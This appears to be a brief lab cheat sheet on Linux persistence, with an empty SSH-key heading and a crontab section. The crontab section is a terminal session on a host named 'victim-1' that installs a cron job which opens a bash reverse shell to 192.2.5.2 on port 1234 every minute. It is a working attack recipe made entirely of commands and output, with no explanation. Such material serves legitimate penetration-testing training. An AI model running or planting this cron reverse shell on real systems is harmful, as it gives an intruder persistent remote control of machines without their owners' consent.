
# Linux Persistence

## SSH Key


## crontab

```bash
student@victim-1:~$ echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.2.5.2/1234 0>&1'" > cron

student@victim-1:~$ cat cron
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.2.5.2/1234 0>&1'

student@victim-1:~$ crontab -i cron

student@victim-1:~$ crontab -l
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.2.5.2/1234 0>&1'
```